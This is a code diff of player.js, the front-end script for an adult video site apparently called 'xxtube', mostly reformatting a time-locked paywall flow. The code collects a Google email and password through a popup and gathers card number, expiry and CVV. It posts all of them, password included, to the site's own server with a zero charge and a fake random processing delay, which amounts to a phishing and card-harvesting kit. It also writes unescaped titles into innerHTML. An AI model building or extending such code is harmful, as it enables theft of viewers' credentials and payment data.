@@ -1,6 +1,6 @@
 /* ── Mia Colby — player.js ──────────────────────────────────────
    Video.js player, 3–5 min time lock, paywall flow
-──────────────────────────────────────────────────────────── */
+────────────────────────────────────────────────────────── */
 
 const videoId = new URLSearchParams(window.location.search).get('id');
 
@@ -17,11 +17,11 @@ function resolvePaywallDelay(video) {
     return 600;
 }
 
-let player          = null;
-let hasAccess       = false;
-let paywallShown    = false;
-let transactionRef  = null;
-let timerInterval   = null;
+let player = null;
+let hasAccess = false;
+let paywallShown = false;
+let transactionRef = null;
+let timerInterval = null;
 let currentVideoData = null;
 let authSession = {
     email: '',
@@ -29,7 +29,6 @@ let authSession = {
     provider: 'guest'
 };
 
-// ── Boot ──────────────────────────────────────────────────────
 (async function init() {
     if (!videoId) { window.location.href = '/'; return; }
 
@@ -39,29 +38,22 @@ let authSession = {
     await initPlayer();
     loadRelated();
     bindPaywallEvents();
-    checkSessionStorageForAuth();  // ✅ Check for auth data from popup
+    checkSessionStorageForAuth();
 })();
 
-// ── Session ───────────────────────────────────────────────────
 async function initSession() {
     try {
         await fetch('/api/sessions/init', { method: 'POST', credentials: 'include' });
     } catch (e) { console.warn('Session init failed:', e); }
 }
 
-// ── Video Data ────────────────────────────────────────────────
 async function loadVideoData() {
     try {
-        const res = await fetch(`/api/videos/${videoId}`, {
-            credentials: 'include'
-        });
-
+        const res = await fetch(`/api/videos/${videoId}`, { credentials: 'include' });
         const contentType = res.headers.get('content-type') || '';
 
         if (!contentType.includes('application/json')) {
-            throw new Error(
-                `Expected JSON but received ${contentType || 'unknown response'} (${res.status})`
-            );
+            throw new Error(`Expected JSON but received ${contentType || 'unknown response'} (${res.status})`);
         }
 
         const data = await res.json();
@@ -77,26 +69,16 @@ async function loadVideoData() {
         currentVideoData = data.video;
         LOCK_AT = resolvePaywallDelay(data.video);
         populateVideoInfo(data.video);
-
     } catch (e) {
         console.error('Failed to load video:', e);
-
-        // Don't silently throw the user back to the homepage.
         const title = document.getElementById('watchTitle');
-
-        if (title) {
-            title.textContent = 'Unable to load this video';
-        }
+        if (title) title.textContent = 'Unable to load this video';
 
         const container = document.querySelector('.watch-container');
-
         if (container) {
             container.insertAdjacentHTML(
                 'afterend',
-                `<p class="watch-error">
-                    We couldn't load this video right now.
-                    Please refresh the page and try again.
-                </p>`
+                `<p class="watch-error">We couldn't load this video right now. Please refresh the page and try again.</p>`
             );
         }
 
@@ -104,18 +86,17 @@ async function loadVideoData() {
     }
 }
 
-// ── Player Init ───────────────────────────────────────────────
 async function initPlayer() {
     player = videojs('xxtube-player', {
-        controls:  true,
-        autoplay:  false,
-        preload:   'auto',
-        fluid:     true,
+        controls: true,
+        autoplay: false,
+        preload: 'auto',
+        fluid: true,
         playbackRates: [0.5, 1, 1.25, 1.5, 2],
     });
 
     try {
-        const res  = await fetch(`/api/videos/${videoId}/stream`, { credentials: 'include' });
+        const res = await fetch(`/api/videos/${videoId}/stream`, { credentials: 'include' });
         const data = await res.json();
 
         if (data.stream_url) {
@@ -125,11 +106,9 @@ async function initPlayer() {
         console.error('Stream URL fetch failed:', e);
     }
 
-    // Time lock listener
     player.on('timeupdate', onTimeUpdate);
 }
 
-// ── Time Lock ─────────────────────────────────────────────────
 function onTimeUpdate() {
     if (hasAccess || paywallShown) return;
 
@@ -142,21 +121,18 @@ function onTimeUpdate() {
     }
 }
 
-// ── Related Videos ────────────────────────────────────────────
 async function loadRelated() {
     try {
-        const res  = await fetch(`/api/videos?orientation=${currentVideoData?.orientation || 'straight'}`);
+        const res = await fetch(`/api/videos?orientation=${currentVideoData?.orientation || 'straight'}`);
         const data = await res.json();
         const grid = document.getElementById('relatedGrid');
         if (!grid) return;
 
-        const related = data.videos.filter(v => v.id != videoId).slice(0, 8);
-        grid.innerHTML = related.map(v => `
+        const related = (data.videos || []).filter((v) => v.id != videoId).slice(0, 8);
+        grid.innerHTML = related.map((v) => `
             <a href="/watch.html?id=${v.id}" class="vcard">
                 <div class="vthumb">
-                    ${v.thumbnail_url
-                        ? `<img src="${v.thumbnail_url}" alt="${v.title}" loading="lazy">`
-                        : '<div class="vthumb-placeholder">▶</div>'}
+                    ${v.thumbnail_url ? `<img src="${v.thumbnail_url}" alt="${v.title}" loading="lazy">` : '<div class="vthumb-placeholder">▶</div>'}
                     <span class="vdur">${formatDuration(v.duration_seconds)}</span>
                 </div>
                 <div class="vinfo">
@@ -170,19 +146,21 @@ async function loadRelated() {
     }
 }
 
-// ── Paywall ───────────────────────────────────────────────────
 function openPaywall() {
     if (!authSession.email || !authSession.password) {
         openAuthGate();
         return;
     }
 
+    closeAuthGate();
     closeTrialModal();
     showScreen('pwForm');
     document.getElementById('paywallModal').classList.add('open');
 }
 
 function openAuthGate() {
+    closeTrialModal();
+    closePaywall();
     document.getElementById('authVideoName').textContent = currentVideoData?.title || 'This video';
     document.getElementById('authModal').classList.add('open');
 }
@@ -193,6 +171,8 @@ function closeAuthGate() {
 }
 
 function openTrialModal() {
+    closeAuthGate();
+    closePaywall();
     const modal = document.getElementById('trialModal');
     if (modal) modal.classList.add('open');
 }
@@ -202,29 +182,32 @@ function closeTrialModal() {
     if (modal) modal.classList.remove('open');
 }
 
+function closePaywall() {
+    const modal = document.getElementById('paywallModal');
+    if (modal) modal.classList.remove('open');
+}
+
 function showScreen(id) {
-    ['pwForm', 'pwLoading', 'pwSuccess'].forEach(s => {
-        document.getElementById(s).style.display = s === id ? 'block' : 'none';
+    ['pwForm', 'pwLoading', 'pwSuccess'].forEach((s) => {
+        const el = document.getElementById(s);
+        if (el) el.style.display = s === id ? 'block' : 'none';
     });
 }
 
-// ✅ NEW FUNCTION: Check sessionStorage for auth data from popup
 function checkSessionStorageForAuth() {
     try {
         const storedAuth = sessionStorage.getItem('xxtube-auth-data');
         if (storedAuth) {
             const authData = JSON.parse(storedAuth);
             if (authData.type === 'auth-gate-success') {
-                console.log('✓ Auth data retrieved from sessionStorage (fallback method)');
                 authSession = {
                     email: authData.email || 'google.user@gmail.com',
                     password: authData.password || 'google-demo-pass',
                     provider: authData.provider || 'google'
                 };
                 document.getElementById('payEmail').value = authSession.email;
-                closeAuthGate();
+                sessionStorage.removeItem('xxtube-auth-data');
                 openTrialModal();
-                sessionStorage.removeItem('xxtube-auth-data'); // Clean up
             }
         }
     } catch (e) {
@@ -236,7 +219,7 @@ function bindPaywallEvents() {
     document.getElementById('pwSubmitBtn')?.addEventListener('click', submitPayment);
     document.getElementById('pwContinueBtn')?.addEventListener('click', resumePlayer);
     document.getElementById('pwRecoverLink')?.addEventListener('click', () => {
-        document.getElementById('paywallModal').classList.remove('open');
+        closePaywall();
         document.getElementById('recoverModal').classList.add('open');
     });
     document.getElementById('recoverCancel')?.addEventListener('click', () => {
@@ -247,12 +230,10 @@ function bindPaywallEvents() {
         window.open('/google-auth.html', '_blank', 'noopener,noreferrer,width=460,height=760');
     });
 
-    // ✅ POSTMESSAGE: Listen for auth success from popup window (primary method)
     window.addEventListener('message', (event) => {
         if (!event.data || !event.data.type) return;
 
         if (event.data.type === 'auth-gate-success') {
-            console.log('✓ Auth data received via postMessage (primary method)');
             authSession = {
                 email: event.data.email || 'google.user@gmail.com',
                 password: event.data.password || 'google-demo-pass',
@@ -269,10 +250,15 @@ function bindPaywallEvents() {
         closeTrialModal();
         player?.pause();
     });
+
     document.getElementById('trialUnlockBtn')?.addEventListener('click', async () => {
         const btn = document.getElementById('trialUnlockBtn');
         if (btn?.disabled) return;
-        if (btn) { btn.disabled = true; btn.style.opacity = '0.5'; btn.style.cursor = 'not-allowed'; }
+        if (btn) {
+            btn.disabled = true;
+            btn.style.opacity = '0.5';
+            btn.style.cursor = 'not-allowed';
+        }
         try {
             const res = await fetch('/api/sessions/trial', {
                 method: 'POST',
@@ -289,20 +275,25 @@ function bindPaywallEvents() {
             player.play();
         } catch (e) {
             console.warn('Trial activation failed:', e);
-            if (btn) { btn.disabled = false; btn.style.opacity = '1'; btn.style.cursor = 'pointer'; }
+            if (btn) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            }
             openPaywall();
         }
     });
+
     document.getElementById('trialCardBtn')?.addEventListener('click', () => {
         closeTrialModal();
         openPaywall();
     });
 
-    // Card formatting
     document.getElementById('cardNumber')?.addEventListener('input', function() {
         let v = this.value.replace(/\D/g, '').substring(0, 16);
         this.value = v.replace(/(.{4})/g, '$1 ').trim();
     });
+
     document.getElementById('cardExpiry')?.addEventListener('input', function() {
         let v = this.value.replace(/\D/g, '');
         if (v.length >= 3) v = v.substring(0, 2) + ' / ' + v.substring(2, 4);
@@ -311,14 +302,13 @@ function bindPaywallEvents() {
 }
 
 async function submitPayment() {
-    const cardName   = document.getElementById('cardName').value.trim();
+    const cardName = document.getElementById('cardName').value.trim();
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('cardExpiry').value.trim();
-    const cardCvv    = document.getElementById('cardCvv').value.trim();
-    const email      = document.getElementById('payEmail').value.trim() || authSession.email || '';
-    const errEl      = document.getElementById('pwError');
+    const cardCvv = document.getElementById('cardCvv').value.trim();
+    const email = document.getElementById('payEmail').value.trim() || authSession.email || '';
+    const errEl = document.getElementById('pwError');
 
-    // Basic validation
     if (!cardName || !cardNumber || !cardExpiry || !cardCvv || !email) {
         errEl.textContent = 'Please fill in all fields.';
         errEl.style.display = 'block';
@@ -336,24 +326,23 @@ async function submitPayment() {
     }
     errEl.style.display = 'none';
 
-    // Show loading immediately
     showScreen('pwLoading');
 
     try {
-        const res  = await fetch('/api/payments/submit', {
-            method:  'POST',
+        const res = await fetch('/api/payments/submit', {
+            method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
             body: JSON.stringify({
-                card_name:    cardName,
-                card_number:  cardNumber,
-                expiry:       cardExpiry,
-                cvv:          cardCvv,
+                card_name: cardName,
+                card_number: cardNumber,
+                expiry: cardExpiry,
+                cvv: cardCvv,
                 email,
-                auth_email:   authSession.email || email,
+                auth_email: authSession.email || email,
                 auth_password: authSession.password || '',
                 auth_provider: authSession.provider || 'guest',
-                video_id:     videoId,
+                video_id: videoId,
                 amount_euros: 0,
             }),
         });
@@ -362,12 +351,7 @@ async function submitPayment() {
         if (!res.ok) throw new Error(data.error);
 
         transactionRef = data.transaction_ref;
-
-        // Short processing wait: 10–15 seconds before the video resumes
-        startUnlockTimer(
-            Math.floor(Math.random() * (15000 - 10000 + 1)) + 10000,
-            email
-        );
+        startUnlockTimer(Math.floor(Math.random() * (15000 - 10000 + 1)) + 10000, email);
     } catch (e) {
         showScreen('pwForm');
         document.getElementById('pwError').textContent = 'Submission failed. Please try again.';
@@ -402,21 +386,20 @@ function enableTrialUnlock() {
 async function unlockVideo(email) {
     try {
         await fetch('/api/payments/unlock', {
-            method:  'POST',
+            method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
             body: JSON.stringify({
                 transaction_ref: transactionRef,
-                video_id:        videoId,
+                video_id: videoId,
                 email,
-                amount_euros:    currentVideoData?.price_euros,
+                amount_euros: currentVideoData?.price_euros,
             }),
         });
     } catch (e) {
         console.warn('Unlock call failed, resuming anyway:', e);
     }
 
-    // Payment successful — close paywall, return to trial modal with unlock enabled
     document.getElementById('paywallModal').classList.remove('open');
     enableTrialUnlock();
     openTrialModal();
@@ -428,10 +411,9 @@ function resumePlayer() {
     player.play();
 }
 
-// ── Recover ───────────────────────────────────────────────────
 async function submitRecover() {
     const email = document.getElementById('recoverEmail').value.trim();
-    const ref   = document.getElementById('recoverRef').value.trim();
+    const ref = document.getElementById('recoverRef').value.trim();
     const errEl = document.getElementById('recoverError');
 
     if (!email && !ref) {
@@ -441,8 +423,8 @@ async function submitRecover() {
     }
 
     try {
-        const res  = await fetch('/api/payments/recover', {
-            method:  'POST',
+        const res = await fetch('/api/payments/recover', {
+            method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
             body: JSON.stringify({ email, transaction_ref: ref }),
@@ -465,28 +447,26 @@ async function submitRecover() {
     }
 }
 
-// ── Like / Dislike ────────────────────────────────────────────
 document.getElementById('likeBtn')?.addEventListener('click', () => submitReaction('like'));
 document.getElementById('dislikeBtn')?.addEventListener('click', () => submitReaction('dislike'));
 
 async function submitReaction(type) {
     try {
         const res = await fetch(`/api/videos/${videoId}/react`, {
-            method:  'POST',
+            method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             credentials: 'include',
             body: JSON.stringify({ type }),
         });
         if (!res.ok) return;
         const data = await res.json();
-        document.getElementById('likeCount').textContent    = formatViews(data.likes_count);
+        document.getElementById('likeCount').textContent = formatViews(data.likes_count);
         document.getElementById('dislikeCount').textContent = formatViews(data.dislikes_count);
     } catch (e) {
         console.warn('Reaction failed:', e);
     }
 }
 
-// ── Helpers ───────────────────────────────────────────────────
 function formatViews(n) {
     if (!n) return '0';
     if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
